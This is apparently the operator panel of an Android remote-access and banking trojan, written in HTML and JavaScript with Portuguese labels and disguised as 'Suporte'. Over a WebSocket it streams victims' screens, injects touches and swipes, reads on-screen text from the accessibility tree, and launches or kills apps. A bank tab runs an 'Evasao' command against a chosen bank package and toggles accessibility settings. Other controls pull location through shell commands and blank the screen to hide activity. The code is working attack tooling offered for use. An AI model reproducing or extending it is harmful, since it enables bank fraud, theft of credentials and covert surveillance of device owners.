<!doctype html>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=referrer content=no-referrer>
<title>Suporte</title>
<style>
*{box-sizing:border-box;margin:0}
:root{--bg:#0a0c10;--pn:#11151b;--ln:#232c38;--tx:#c3ccd8;--dim:#6a7686;--ac:#3d8bfd;--ok:#2ea043;--err:#f85149}
body{background:var(--bg);color:var(--tx);font:12px/1.45 system-ui;height:100vh;display:flex;flex-direction:column;overflow:hidden}
header{display:flex;gap:5px;align-items:center;padding:6px 8px;background:var(--pn);border-bottom:1px solid var(--ln);flex-wrap:wrap;flex:none}
main{flex:1;display:flex;min-height:0}
#wrap{flex:1;position:relative;background:#000;min-width:0}
#wrap.oculto{display:none}
#scr{position:absolute;inset:0;margin:auto;max-width:100%;max-height:100%;object-fit:contain;cursor:crosshair;user-select:none;touch-action:none}
#st{position:absolute;left:0;bottom:0;padding:2px 8px;font:11px monospace;color:#d29922;background:#000a;pointer-events:none}
aside{width:400px;display:flex;flex-direction:column;background:var(--pn);border-left:1px solid var(--ln);min-width:0}
#topo{padding:5px 8px;font:11px monospace;color:var(--dim);border-bottom:1px solid var(--ln)}
#body{flex:1;overflow:auto;padding:7px}
button,select,input{background:#161c24;color:var(--tx);border:1px solid var(--ln);padding:4px 7px;font-size:11px;border-radius:5px;cursor:pointer;font-family:inherit}
button:hover{background:#1e2731}
button.on{background:#153a63;border-color:#1f5c9c;color:#dceaff}
button.pri{background:#153a63;border-color:#1f5c9c;color:#dceaff}
button.dg{border-color:#4d2323;color:#ffb4ae}
input{flex:1;cursor:text}
select{max-width:180px}
.ln{display:flex;gap:5px;align-items:center;margin-bottom:5px;flex-wrap:wrap}
.sm{font:10px monospace;color:var(--dim)}
.dot{width:8px;height:8px;border-radius:50%;background:#39424e}
.dot.on{background:var(--ok)}
.dot.w{background:#d29922}
.no{display:flex;gap:4px;align-items:center;padding:3px 0;border-bottom:1px solid #141a21;cursor:pointer}
.no:hover{background:#151b22}
.no .tx{flex:1;word-break:break-word}
.no .cl{color:var(--dim);font-size:9.5px}
#out{font:11px monospace;white-space:pre-wrap;word-break:break-all;color:var(--dim)}
#toast{position:fixed;right:10px;bottom:10px;display:flex;flex-direction:column;gap:4px;z-index:9;pointer-events:none}
#toast div{background:#1b232d;border:1px solid #2d3a49;padding:5px 9px;border-radius:5px;font-size:11px}
</style>
<header>
<select id=dev><option value="">-- aparelho --</option></select><span id=dot class=dot></span>
<button class=pri onclick="c('shot',{on:true})">Ver tela</button>
<button class=dg onclick="c('off')">Desligar</button>
<button onclick="c('screen',{on:true})">Acordar</button>
<button onclick="tela()">sem tela</button>
<button class=pri onclick="go('palavras')">texto</button>
<button onclick="go('apps')">apps</button>
<button onclick="go('banco')">banco</button>
<button onclick="go('local')">local</button>
<button onclick="go('ajustes')">ajustes</button>
</header>
<main>
<div id=wrap><img id=scr><div id=st></div></div>
<aside>
<div id=topo>--</div>
<div id=body>
<div id=v-live>
<div class="ln sm">toque = clique, arraste = swipe, segure = toque longo</div>
<div class=ln><button onclick="k(4)">Voltar</button><button onclick="k(3)">Home</button><button onclick="k(187)">Recentes</button><button onclick="k(26)">Notifica</button></div>
<pre id=out></pre>
</div>
<div id=v-palavras style=display:none>
<div class=ln><button onclick="c('utree')">Atualizar</button><button onclick="c('applist')">Apps</button></div>
<div id=pw></div>
</div>
<div id=v-apps style=display:none>
<div class=ln><input id=fa placeholder="filtrar"><button onclick="c('applist')">Atualizar</button></div>
<div id=al></div>
</div>
<div id=v-banco style=display:none>
<div class=ln><input id=bp placeholder="pacote do banco"><button class=pri onclick="bank()">Evasao</button></div>
<div class=ln><button onclick="c('unbank')">Restaurar</button><button onclick="c('shell',{cmd:'settings put secure accessibility_enabled 1'})">A11y on</button><button onclick="c('shell',{cmd:'settings put secure accessibility_enabled 0'})">A11y off</button></div>
<pre id=bo></pre>
</div>
<div id=v-local style=display:none>
<div class=ln><button onclick="local()">Puxar</button><button onclick="c('shell',{cmd:'am start -a android.intent.action.VIEW -d geo:0,0'})">Abrir mapa</button></div>
<pre id=lo></pre>
</div>
<div id=v-ajustes style=display:none>
<div class=ln>Qualidade <input id=q type=range min=15 max=90 value=35 oninput="c('q',{v:+this.value})"></div>
<div class=ln>Quadros <input id=f type=range min=1 max=15 value=6 oninput="c('fps',{v:+this.value})"></div>
<div class=ln>Largura <input id=r type=range min=360 max=1080 step=180 value=540 oninput="c('res',{v:+this.value})"></div>
<div class=ln><button onclick="c('recon')">Reconectar</button><button onclick="c('geo')">Resolucao</button></div>
</div>
</div>
</aside>
</main>
<div id=toast></div>
<script>
const T=new URLSearchParams(location.search).get('t')||'';
const $=s=>document.querySelector(s);
const dev=$('#dev'),scr=$('#scr'),st=$('#st'),dot=$('#dot'),wrap=$('#wrap');
let w=null,sel='',geo={w:0,h:0},DEVS=[],apps=[],xml='',vNow='live',ult=0;
if(T) history.replaceState(null,'','/');
function toq(x){var d=document.createElement('div');d.textContent=x;$('#toast').appendChild(d);setTimeout(()=>d.remove(),2500)}
function log(x){var o=$('#out');o.textContent=(o.textContent+x+'\n').slice(-7000);o.scrollTop=o.scrollHeight}
function c(n,x){if(w&&w.readyState===1&&sel)w.send(JSON.stringify(Object.assign({c:n,id:sel},x||{})))}
function k(n){c('key',{code:n})}
function go(v){vNow=v;['live','palavras','apps','banco','local','ajustes'].forEach(n=>{var e=$('#v-'+n);if(e)e.style.display=n===v?'block':'none'})}
function tela(){wrap.classList.toggle('oculto');if(wrap.classList.contains('oculto'))c('shot',{on:false});else c('shot',{on:true})}
function geoDe(){var o=dev.options[dev.selectedIndex];if(!o||!o.value)return;var m=/(\d+)x(\d+)/.exec(o.textContent||'');if(m){geo={w:+m[1],h:+m[2]}}}
function rectImg(){var r=scr.getBoundingClientRect(),nx=scr.naturalWidth,ny=scr.naturalHeight;if(!r.width||!r.height||!nx||!ny)return null;var s=Math.min(r.width/nx,r.height/ny),ww=nx*s,hh=ny*s;return{l:r.left+(r.width-ww)/2,t:r.top+(r.height-hh)/2,w:ww,h:hh}}
function pt(e){var g=rectImg();if(!g||!geo.w)return null;var fx=(e.clientX-g.l)/g.w,fy=(e.clientY-g.t)/g.h;if(fx<0||fy<0||fx>1||fy>1)return null;return{x:Math.round(fx*geo.w),y:Math.round(fy*geo.h)}}
function pick(){sel=dev.value;scr.removeAttribute('src');geoDe();if(sel&&w&&w.readyState===1)w.send(JSON.stringify({c:'sel',id:sel}));log('[*] '+(sel||'nenhum'))}
dev.onchange=pick;
let dn=null,t0=0;
scr.onpointerdown=e=>{e.preventDefault();dn=pt(e);t0=Date.now();try{scr.setPointerCapture(e.pointerId)}catch(_){}};
scr.onpointerup=e=>{var d=dn;dn=null;if(!d)return;var u=pt(e);if(!u)return;var dist=Math.abs(u.x-d.x)+Math.abs(u.y-d.y),ms=Date.now()-t0;
if(dist<16&&ms>520){c('long',{x:d.x,y:d.y})}else if(dist<16){c('touch',{x:d.x,y:d.y})}else{c('swipe',{x1:d.x,y1:d.y,x2:u.x,y2:u.y,ms:Math.min(600,Math.max(120,ms))})}};
scr.onpointercancel=()=>{dn=null};
function frame(b){st.textContent='';var url=URL.createObjectURL(new Blob([b],{type:'image/jpeg'})),old=scr.src;scr.onload=()=>{if(old&&old.startsWith('blob:'))URL.revokeObjectURL(old);scr.onload=null};scr.src=url;ult=Date.now()}
function abrir(p){c('shell',{cmd:'monkey -p '+p+' -c android.intent.category.LAUNCHER 1'})}
function info(p){c('shell',{cmd:'am start -a android.settings.APPLICATION_DETAILS_SETTINGS -d package:'+p})}
function parar(p){c('shell',{cmd:'am force-stop '+p})}
function bt(tx,ti,fn){var b=document.createElement('button');b.textContent=tx;b.title=ti;b.onclick=ev=>{ev.stopPropagation();fn()};return b}
function renderPw(){
if(vNow!=='palavras')return;
var box=$('#pw');box.innerHTML='';
if(!xml){box.textContent='sem leitura ainda';return}
var doc=null;try{doc=new DOMParser().parseFromString(xml,'text/xml')}catch(e){}
if(!doc){box.textContent='xml invalido';return}
var ns=doc.getElementsByTagName('node'),n=0;
for(var i=0;i<ns.length&&n<400;i++){
var el=ns[i],txt=((el.getAttribute('text')||'')+' '+(el.getAttribute('content-desc')||'')).trim();
if(!txt)continue;
var m=/\[(\d+),(\d+)\]\[(\d+),(\d+)\]/.exec(el.getAttribute('bounds')||'');if(!m)continue;
var x=Math.round(((+m[1])+(+m[3]))/2),y=Math.round(((+m[2])+(+m[4]))/2);if(!x||!y)continue;
n++;
var d=document.createElement('div');d.className='no';
var tx=document.createElement('span');tx.className='tx';tx.textContent=txt;
tx.onclick=()=>{c('utap',{x:x,y:y});toq('toque: '+txt)};
d.appendChild(tx);
d.appendChild(bt('segure','toque longo',()=>c('ulong',{x:x,y:y})));
d.appendChild(bt('toque','tocar',()=>c('utap',{x:x,y:y})));
box.appendChild(d)}
if(!n)box.textContent='tela sem texto legivel';
}
function renderApps(){
if(vNow!=='apps')return;
var q=($('#fa').value||'').toLowerCase(),box=$('#al');box.innerHTML='';
var v=apps.filter(o=>!q||(o.n||'').toLowerCase().includes(q)||(o.p||'').toLowerCase().includes(q));
if(!v.length){box.textContent='sem lista';return}
v.forEach(o=>{var d=document.createElement('div');d.className='no';var tx=document.createElement('span');tx.className='tx';tx.textContent=o.n;tx.onclick=()=>abrir(o.p);d.appendChild(tx);d.appendChild(bt('abrir','abrir',()=>abrir(o.p)));d.appendChild(bt('info','detalhes',()=>info(o.p)));d.appendChild(bt('x','parar',()=>parar(o.p)));box.appendChild(d)});
}
function bank(){var p=($('#bp').value||'').trim();if(!p){toq('sem pacote');return}c('bank',{pkg:p});toq('evasao: '+p)}
function local(){var n=$('#out').textContent.length;c('shell',{cmd:'dumpsys location'});setTimeout(()=>{$('#lo').textContent=$('#out').textContent.slice(n)||'(sem resposta)'},2000)}
function co(){
w=new WebSocket((location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/panel?t='+T);
w.binaryType='arraybuffer';
w.onopen=()=>{log('[ok]');setInterval(()=>{if(w.readyState===1)w.send('{"c":"ping"}')},5000)};
w.onclose=()=>{log('[caiu]');setTimeout(co,1500)};
w.onmessage=e=>{
if(typeof e.data!=='string'){frame(e.data);return}
var m;try{m=JSON.parse(e.data)}catch(_){return}
if(m.k==='devs'){DEVS=m.d;var cur=dev.value;dev.innerHTML='<option value="">-- aparelho --</option>';
m.d.forEach(x=>{var o=document.createElement('option');o.value=x.id;o.textContent=x.id+' '+x.m+' '+x.w+'x'+x.h;dev.appendChild(o)});
if(!sel&&m.d.length){dev.value=m.d[0].id;pick()}else if(cur&&m.d.some(x=>x.id===cur))dev.value=cur;
else if(sel&&!m.d.some(x=>x.id===sel)&&m.d.length){dev.value=m.d[0].id;pick()}
return}
if(m.k!=='log')return;
var x=m.d;
if(x.t==='utree'){xml=x.o||'';renderPw();return}
if(x.t==='apps'){apps=x.o||[];renderApps();return}
if(x.t==='off'){scr.removeAttribute('src');st.textContent='desligado';dot.className='dot';return}
if(x.t==='geo'){if(x.o&&x.o.w){geo={w:x.o.w,h:x.o.h}}return}
if(x.t==='err'){st.textContent=x.o;log('! '+x.o);return}
if(x.t==='bank'){$('#bo').textContent=x.o;return}
if(x.t==='pong')return;
log(x.t+': '+(x.o||''));
};
}
setInterval(()=>{if(!sel){dot.className='dot';st.textContent='nenhum aparelho';return}
if(!ult||Date.now()-ult>3000){dot.className='dot w';if(!st.textContent)st.textContent='sem imagem'}else dot.className='dot on'},1000);
setInterval(()=>{if(vNow==='palavras')c('utree')},1900);
setInterval(renderPw,900);
$('#fa').oninput=renderApps;
co();
</script>
